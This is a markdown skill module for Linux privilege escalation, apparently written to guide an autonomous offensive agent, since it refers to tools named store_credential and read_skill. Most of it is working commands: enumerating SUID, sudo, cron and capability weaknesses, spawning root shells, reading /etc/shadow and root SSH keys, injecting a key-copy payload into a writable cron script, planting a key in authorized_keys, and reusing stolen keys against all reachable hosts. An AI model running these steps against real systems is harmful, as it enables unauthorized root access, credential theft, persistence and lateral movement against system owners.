# Privilege Escalation

**Objective:** Elevate from a restricted shell to root to access protected credential material.

---

## When This Applies

Use when the compromised shell is non-root and protected files (SSH keys, shadow, root-owned configs) are needed. Escalate the minimum necessary to reach the target — it is a means to an end.

---

## Enumerate First

Never guess. Spend 60 seconds enumerating before attempting anything.

```bash
# Who you are and what groups you belong to
id && whoami

# Sudo rights — look for NOPASSWD entries
sudo -l

# SUID binaries owned by root
find / -perm -4000 -user root -type f 2>/dev/null

# Files with dangerous capabilities
getcap -r / 2>/dev/null | grep -E "setuid|dac_read|sys_admin|setgid"

# Writable cron jobs and init scripts
crontab -l 2>/dev/null
cat /etc/crontab /etc/cron.d/* 2>/dev/null
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null

# World-writable files owned by root (potential injection points)
find /etc /usr/local/bin /opt -writable -user root -type f 2>/dev/null
```

---

## Common Paths

**Sudo misconfigurations** — `sudo -l` shows NOPASSWD entries. Interpreters, editors, and pagers can read arbitrary files or spawn shells.

```bash
# Arbitrary file read via sudo (example: less, vim, python)
sudo less /etc/shadow
sudo python3 -c 'print(open("/etc/shadow").read())'
sudo vim -c ':r /root/.ssh/id_rsa'
```

**SUID binaries** — root-owned SUID interpreters or known-exploitable binaries run with effective root context. Cross-reference findings with GTFOBins.

```bash
# e.g. find / -perm -4000 returns /usr/bin/python3
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Writable cron/init scripts** — scripts owned or writable by the current user that execute as root can be modified to exfiltrate credentials.

```bash
# Append a key-copy payload to a writable cron script
echo 'cp /root/.ssh/id_rsa /tmp/root_key && chmod 644 /tmp/root_key' >> /path/to/writable_script.sh
# Wait for the next cron tick, then retrieve /tmp/root_key
```

**Capabilities** — `cap_setuid`, `cap_dac_read_search`, or `cap_sys_admin` on a binary is often as useful as SUID root.

```bash
# cap_dac_read_search on python3 -> read any file
python3 -c 'import ctypes; print(open("/etc/shadow").read())'

# cap_setuid -> spawn root shell
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Goal

Almost always one of: read a protected SSH key, read the shadow file, or write to `authorized_keys`. Stop once the target credential is reached.

```bash
# Common target files
cat /etc/shadow
cat /root/.ssh/id_rsa
cat /home/*/.ssh/id_rsa

# Plant your own key if write access to root home is gained
echo "<your_pubkey>" >> /root/.ssh/authorized_keys
```

---

## After Escalation

Store any newly accessible credentials with `store_credential`. If an SSH key is found, try it against all reachable targets before moving on — use `read_skill("recon")` to confirm what's reachable if the host list is stale.
